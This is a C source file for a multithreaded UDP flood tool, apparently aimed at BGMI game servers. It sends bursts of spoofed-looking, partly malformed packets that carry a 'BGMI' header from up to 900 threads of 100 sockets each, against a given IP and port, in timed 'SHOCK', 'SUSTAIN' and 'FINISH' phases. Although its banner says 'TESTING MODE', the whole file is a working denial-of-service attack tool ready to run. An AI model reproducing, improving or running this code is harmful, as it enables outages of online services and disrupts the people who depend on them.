#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <fcntl.h>
#include <stdatomic.h>
#include <signal.h>
#include <errno.h>
#include <sys/time.h>

#define MAX_SOCKETS_PER_THREAD 100
#define MAX_THREADS_LIMIT 900
#define MIN_THREADS_LIMIT 10
#define MAX_PACKET_SIZE_LIMIT 1024
#define MIN_PACKET_SIZE_LIMIT 20
#define MAX_TIME_LIMIT 300
#define MIN_TIME_LIMIT 10
#define SOCKET_BUFFER_SIZE 16777216
#define PORT_RANGE_AVAILABLE 50000
#define MIN_SOURCE_PORT 5000
#define PACKETS_PER_BURST 60
#define SOCKET_RECONNECT_AT 10000
#define STATS_UPDATE_SECONDS 1
#define PACKETS_BATCH_SIZE 1000
#define MALFORMED_PACKETS_PERCENT 30
#define THREAD_CREATION_DELAY_MS 5
#define ATTACK_CYCLE_MS 25
#define ENABLE_PHASE_MANAGEMENT 1

char TARGET_IP[INET_ADDRSTRLEN];
int TARGET_PORT;
int ATTACK_DURATION;
int PACKET_SIZE;
int THREAD_COUNT;

_Atomic unsigned long long total_packets_sent = 0;
_Atomic unsigned long long total_bytes_sent = 0;
_Atomic unsigned long long current_packets_per_second = 0;
_Atomic unsigned long long peak_packets_per_second = 0;
_Atomic int attack_stop_signal = 0;
_Atomic int threads_ready = 0;
_Atomic int attack_phase = 0;
_Atomic int seconds_elapsed = 0;

struct sockaddr_in target_address;

void signal_handler(int sig) {
    atomic_store(&attack_stop_signal, 1);
}

unsigned int random_generator(unsigned int *seed) {
    *seed = (*seed * 1103515245 + 12345);
    return *seed ^ (*seed >> 16);
}

int configure_socket(int socket_fd) {
    int buffer_size = SOCKET_BUFFER_SIZE;
    int reuse = 1;
    
    setsockopt(socket_fd, SOL_SOCKET, SO_SNDBUF, &buffer_size, sizeof(buffer_size));
    setsockopt(socket_fd, SOL_SOCKET, SO_REUSEADDR, &reuse, sizeof(reuse));
    
    #ifdef SO_REUSEPORT
    setsockopt(socket_fd, SOL_SOCKET, SO_REUSEPORT, &reuse, sizeof(reuse));
    #endif
    
    return 0;
}

int get_phase_power(int phase) {
    if (!ENABLE_PHASE_MANAGEMENT) return 100;
    
    switch(phase) {
        case 0: return 150;
        case 1: return 100;
        case 2: return 120;
        default: return 100;
    }
}

int get_phase_delay(int phase) {
    if (!ENABLE_PHASE_MANAGEMENT) return 50;
    
    switch(phase) {
        case 0: return 0;
        case 1: return 50;
        case 2: return 30;
        default: return 50;
    }
}

void create_bgmi_packet(char *packet, int size, int thread_id, unsigned int seq, unsigned int *seed) {
    int actual_size = size;
    if (actual_size > MAX_PACKET_SIZE_LIMIT) actual_size = MAX_PACKET_SIZE_LIMIT;
    if (actual_size < MIN_PACKET_SIZE_LIMIT) actual_size = MIN_PACKET_SIZE_LIMIT;
    
    memset(packet, 0, actual_size);
    
    packet[0] = 0x42;
    packet[1] = 0x47;
    packet[2] = 0x4D;
    packet[3] = 0x49;
    
    unsigned int *header = (unsigned int*)(packet + 4);
    
    unsigned int types[] = {
        htonl(0x00010001), htonl(0x00010002), htonl(0x00020001),
        htonl(0x00030001), htonl(0x00040001)
    };
    int type_index = (thread_id + seq) % 5;
    header[0] = types[type_index];
    
    header[1] = htonl(seq + thread_id * 1000000);
    header[2] = htonl((unsigned int)time(NULL));
    header[3] = htonl(0x00000001 + (seq % 7));
    
    int payload_start = 20;
    if (payload_start >= actual_size) payload_start = actual_size - 1;
    
    for (int i = payload_start; i < actual_size; i++) {
        packet[i] = (random_generator(seed) + i + thread_id + seq) & 0xFF;
    }
    
    if ((random_generator(seed) % 100) < MALFORMED_PACKETS_PERCENT) {
        int corrupt_type = random_generator(seed) % 4;
        switch(corrupt_type) {
            case 0: packet[4] = 0xFF; packet[5] = 0xFF; break;
            case 1: packet[0] = 0x00; break;
            case 2: memset(packet + 12, 0xAA, 8); break;
            case 3: packet[actual_size-1] = 0xEE; break;
        }
    }
}

int create_and_bind_socket(unsigned int *seed) {
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) return -1;
    
    configure_socket(sock);
    
    if (fcntl(sock, F_SETFL, O_NONBLOCK) < 0) {
        close(sock);
        return -1;
    }
    
    struct sockaddr_in src_addr;
    memset(&src_addr, 0, sizeof(src_addr));
    src_addr.sin_family = AF_INET;
    src_addr.sin_port = htons(MIN_SOURCE_PORT + (random_generator(seed) % PORT_RANGE_AVAILABLE));
    src_addr.sin_addr.s_addr = INADDR_ANY;
    
    if (bind(sock, (struct sockaddr*)&src_addr, sizeof(src_addr)) != 0) {
        close(sock);
        return -1;
    }
    
    return sock;
}

void *attack_thread(void *arg) {
    int thread_id = *((int *)arg);
    
    struct timeval tv;
    gettimeofday(&tv, NULL);
    unsigned int seed = (thread_id * 123456789) ^ getpid() ^ (tv.tv_usec & 0xFFFF);
    
    int sockets[MAX_SOCKETS_PER_THREAD];
    char *packets[MAX_SOCKETS_PER_THREAD];
    
    for (int i = 0; i < MAX_SOCKETS_PER_THREAD; i++) {
        sockets[i] = -1;
        packets[i] = NULL;
    }
    
    for (int i = 0; i < MAX_SOCKETS_PER_THREAD; i++) {
        sockets[i] = create_and_bind_socket(&seed);
        if (sockets[i] < 0) continue;
        
        packets[i] = malloc(MAX_PACKET_SIZE_LIMIT);
        if (!packets[i]) {
            close(sockets[i]);
            sockets[i] = -1;
        }
    }
    
    atomic_fetch_add(&threads_ready, 1);
    
    while (atomic_load(&threads_ready) < THREAD_COUNT && 
           !atomic_load(&attack_stop_signal)) {
        usleep(100);
    }
    
    unsigned long long local_packets = 0;
    unsigned long long local_bytes = 0;
    unsigned int sequence = thread_id * 1000000;
    unsigned int sent_count[MAX_SOCKETS_PER_THREAD];
    
    for (int i = 0; i < MAX_SOCKETS_PER_THREAD; i++) {
        sent_count[i] = 0;
    }
    
    struct timeval last_cycle;
    gettimeofday(&last_cycle, NULL);
    
    while (!atomic_load(&attack_stop_signal)) {
        int current_phase = atomic_load(&attack_phase);
        int power_multiplier = get_phase_power(current_phase);
        int cycle_delay = get_phase_delay(current_phase);
        
        struct timeval now;
        gettimeofday(&now, NULL);
        
        long elapsed_us = (now.tv_sec - last_cycle.tv_sec) * 1000000L + 
                         (now.tv_usec - last_cycle.tv_usec);
        
        if (elapsed_us < ATTACK_CYCLE_MS * 1000) {
            usleep(100);
            continue;
        }
        
        last_cycle = now;
        
        for (int i = 0; i < MAX_SOCKETS_PER_THREAD && 
             !atomic_load(&attack_stop_signal); i++) {
            
            if (sockets[i] < 0 || !packets[i]) continue;
            
            if (sent_count[i] > SOCKET_RECONNECT_AT) {
                close(sockets[i]);
                sockets[i] = create_and_bind_socket(&seed);
                sent_count[i] = 0;
                if (sockets[i] < 0) {
                    free(packets[i]);
                    packets[i] = NULL;
                    continue;
                }
            }
            
            create_bgmi_packet(packets[i], PACKET_SIZE, thread_id, sequence, &seed);
            
            int adjusted_burst = (PACKETS_PER_BURST * power_multiplier) / 100;
            
            for (int b = 0; b < adjusted_burst && !atomic_load(&attack_stop_signal); b++) {
                int ret = sendto(sockets[i], packets[i], PACKET_SIZE, MSG_DONTWAIT,
                               (struct sockaddr*)&target_address, sizeof(target_address));
                if (ret > 0) {
                    local_packets++;
                    local_bytes += ret;
                    sequence++;
                    sent_count[i]++;
                }
            }
        }
        
        if (local_packets >= PACKETS_BATCH_SIZE) {
            atomic_fetch_add(&total_packets_sent, local_packets);
            atomic_fetch_add(&total_bytes_sent, local_bytes);
            local_packets = 0;
            local_bytes = 0;
        }
        
        usleep(cycle_delay);
    }
    
    if (local_packets > 0) {
        atomic_fetch_add(&total_packets_sent, local_packets);
        atomic_fetch_add(&total_bytes_sent, local_bytes);
    }
    
    for (int i = 0; i < MAX_SOCKETS_PER_THREAD; i++) {
        if (sockets[i] >= 0) close(sockets[i]);
        if (packets[i]) free(packets[i]);
    }
    
    return NULL;
}

void *phase_manager(void *arg) {
    int *duration = (int *)arg;
    
    for (int sec = 0; sec < *duration && !atomic_load(&attack_stop_signal); sec++) {
        sleep(1);
        atomic_store(&seconds_elapsed, sec);
        
        if (ENABLE_PHASE_MANAGEMENT) {
            if (sec < 30) {
                atomic_store(&attack_phase, 0);
            } else if (sec < 180) {
                atomic_store(&attack_phase, 1);
            } else {
                atomic_store(&attack_phase, 2);
            }
        }
    }
    
    atomic_store(&attack_stop_signal, 1);
    return NULL;
}

void *stats_display(void *arg) {
    unsigned long long last_packets = 0;
    unsigned long long last_bytes = 0;
    time_t last_time = 0;
    
    int first = 1;
    
    printf("Waiting for threads to initialize...\n");
    
    while (atomic_load(&threads_ready) < THREAD_COUNT && 
           !atomic_load(&attack_stop_signal)) {
        usleep(100000);
        printf("Ready: %d/%d threads\n", atomic_load(&threads_ready), THREAD_COUNT);
    }
    
    printf("\n⚡ ATTACK STARTED ⚡\n\n");
    
    while (!atomic_load(&attack_stop_signal)) {
        sleep(STATS_UPDATE_SECONDS);
        
        time_t now = time(NULL);
        if (first) {
            last_packets = atomic_load(&total_packets_sent);
            last_bytes = atomic_load(&total_bytes_sent);
            last_time = now;
            first = 0;
            continue;
        }
        
        int elapsed = now - last_time;
        if (elapsed <= 0) continue;
        
        unsigned long long curr_p = atomic_load(&total_packets_sent);
        unsigned long long curr_b = atomic_load(&total_bytes_sent);
        
        if (curr_p < last_packets) {
            last_packets = curr_p;
            last_bytes = curr_b;
            last_time = now;
            continue;
        }
        
        unsigned long long diff_p = curr_p - last_packets;
        unsigned long long diff_b = curr_b - last_bytes;
        
        double pps = (double)diff_p / elapsed;
        double mbps = (diff_b * 8.0) / (1024.0 * 1024.0 * elapsed);
        
        atomic_store(&current_packets_per_second, (unsigned long long)pps);
        
        if (pps > atomic_load(&peak_packets_per_second)) {
            atomic_store(&peak_packets_per_second, (unsigned long long)pps);
        }
        
        int phase = atomic_load(&attack_phase);
        char *phase_name;
        switch(phase) {
            case 0: phase_name = "SHOCK"; break;
            case 1: phase_name = "SUSTAIN"; break;
            case 2: phase_name = "FINISH"; break;
            default: phase_name = "NORMAL";
        }
        
        printf("🔥 %s | PPS: %.0fK | Peak: %.0fK | %.1f Mbps\n", 
               phase_name, pps/1000, atomic_load(&peak_packets_per_second)/1000, mbps);
        
        last_packets = curr_p;
        last_bytes = curr_b;
        last_time = now;
    }
    
    return NULL;
}

int main(int argc, char *argv[]) {
    setvbuf(stdout, NULL, _IONBF, 0);
    
    if (argc != 6) {
        printf("Usage: %s IP PORT TIME SIZE THREADS\n", argv[0]);
        printf("TIME: %d-%d seconds\n", MIN_TIME_LIMIT, MAX_TIME_LIMIT);
        printf("SIZE: %d-%d bytes\n", MIN_PACKET_SIZE_LIMIT, MAX_PACKET_SIZE_LIMIT);
        printf("THREADS: %d-%d\n", MIN_THREADS_LIMIT, MAX_THREADS_LIMIT);
        return 1;
    }
    
    strncpy(TARGET_IP, argv[1], sizeof(TARGET_IP)-1);
    TARGET_IP[sizeof(TARGET_IP)-1] = '\0';
    
    char *end;
    TARGET_PORT = (int)strtol(argv[2], &end, 10);
    if (*end != '\0' || TARGET_PORT <= 0 || TARGET_PORT > 65535) {
        printf("Invalid port\n");
        return 1;
    }
    
    ATTACK_DURATION = (int)strtol(argv[3], &end, 10);
    if (*end != '\0' || ATTACK_DURATION < MIN_TIME_LIMIT) ATTACK_DURATION = MIN_TIME_LIMIT;
    if (ATTACK_DURATION > MAX_TIME_LIMIT) ATTACK_DURATION = MAX_TIME_LIMIT;
    
    PACKET_SIZE = (int)strtol(argv[4], &end, 10);
    if (*end != '\0' || PACKET_SIZE < MIN_PACKET_SIZE_LIMIT) PACKET_SIZE = MIN_PACKET_SIZE_LIMIT;
    if (PACKET_SIZE > MAX_PACKET_SIZE_LIMIT) PACKET_SIZE = MAX_PACKET_SIZE_LIMIT;
    
    THREAD_COUNT = (int)strtol(argv[5], &end, 10);
    if (*end != '\0' || THREAD_COUNT < MIN_THREADS_LIMIT) THREAD_COUNT = MIN_THREADS_LIMIT;
    if (THREAD_COUNT > MAX_THREADS_LIMIT) THREAD_COUNT = MAX_THREADS_LIMIT;
    
    memset(&target_address, 0, sizeof(target_address));
    target_address.sin_family = AF_INET;
    target_address.sin_port = htons(TARGET_PORT);
    
    if (inet_pton(AF_INET, TARGET_IP, &target_address.sin_addr) <= 0) {
        printf("Invalid IP\n");
        return 1;
    }
    
    struct timeval tv;
    gettimeofday(&tv, NULL);
    srand(tv.tv_usec ^ getpid() ^ ((unsigned int)time(NULL) << 16));
    
    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);
    
    atomic_store(&total_packets_sent, 0);
    atomic_store(&total_bytes_sent, 0);
    atomic_store(&current_packets_per_second, 0);
    atomic_store(&peak_packets_per_second, 0);
    atomic_store(&attack_stop_signal, 0);
    atomic_store(&threads_ready, 0);
    atomic_store(&attack_phase, 0);
    atomic_store(&seconds_elapsed, 0);
    
    printf("\n🔥 MR.X TESTING MODE 🔥\n\n");
    printf("🎯 Target: %s:%d\n", TARGET_IP, TARGET_PORT);
    printf("⏰ Time: %d seconds\n", ATTACK_DURATION);
    printf("📦 Packet Size: %d bytes (Testing)\n", PACKET_SIZE);
    printf("👥 Threads: %d\n", THREAD_COUNT);
    printf("🔗 Total Connections: %d\n", THREAD_COUNT * MAX_SOCKETS_PER_THREAD);
    printf("⚡ Phase Management: %s\n\n", ENABLE_PHASE_MANAGEMENT ? "ENABLED" : "DISABLED");
    
    pthread_t *threads = malloc(THREAD_COUNT * sizeof(pthread_t));
    int *tids = malloc(THREAD_COUNT * sizeof(int));
    
    if (!threads || !tids) {
        printf("Memory error\n");
        return 1;
    }
    
    int threads_created = 0;
    for (int i = 0; i < THREAD_COUNT; i++) {
        tids[i] = i;
        if (pthread_create(&threads[i], NULL, attack_thread, &tids[i]) == 0) {
            threads_created++;
        } else {
            tids[i] = -1;
        }
        usleep(THREAD_CREATION_DELAY_MS * 1000);
    }
    
    printf("Created %d/%d attack threads\n", threads_created, THREAD_COUNT);
    
    pthread_t phase_thread;
    if (pthread_create(&phase_thread, NULL, phase_manager, &ATTACK_DURATION) != 0) {
        printf("Failed to create phase manager\n");
        atomic_store(&attack_stop_signal, 1);
    }
    
    pthread_t stats_thread;
    if (pthread_create(&stats_thread, NULL, stats_display, NULL) != 0) {
        printf("Failed to create stats thread\n");
        atomic_store(&attack_stop_signal, 1);
    }
    
    pthread_join(phase_thread, NULL);
    
    atomic_store(&attack_stop_signal, 1);
    
    for (int i = 0; i < THREAD_COUNT; i++) {
        if (tids[i] != -1) {
            pthread_join(threads[i], NULL);
        }
    }
    
    pthread_join(stats_thread, NULL);
    
    unsigned long long final_p = atomic_load(&total_packets_sent);
    unsigned long long final_b = atomic_load(&total_bytes_sent);
    
    if (ATTACK_DURATION > 0) {
        double avg_pps = final_p / (double)ATTACK_DURATION;
        double total_gb = final_b / (1024.0 * 1024.0 * 1024.0);
        double avg_mbps = (final_b * 8.0) / (ATTACK_DURATION * 1024.0 * 1024.0);
        
        printf("\n📊 TEST RESULTS 📊\n\n");
        printf("✅ Total Packets: %llu\n", final_p);
        printf("🚀 Average PPS: %.0fK\n", avg_pps/1000);
        printf("📈 Peak PPS: %.0fK\n", atomic_load(&peak_packets_per_second)/1000);
        printf("💾 Total Data: %.2f GB\n", total_gb);
        printf("📡 Average Bandwidth: %.1f Mbps\n", avg_mbps);
        printf("⏱️  Duration: %d seconds\n", ATTACK_DURATION);
        
        printf("\n💡 RECOMMENDATION:\n");
        printf("Best Packet Size: %d bytes\n", PACKET_SIZE);
        printf("Optimal Threads: %d\n", THREAD_COUNT);
        printf("Expected Notice: %s\n", avg_pps > 50000 ? "✅ YES (100%)" : "❌ MAYBE");
    }
    
    free(threads);
    free(tids);
    
    return 0;
}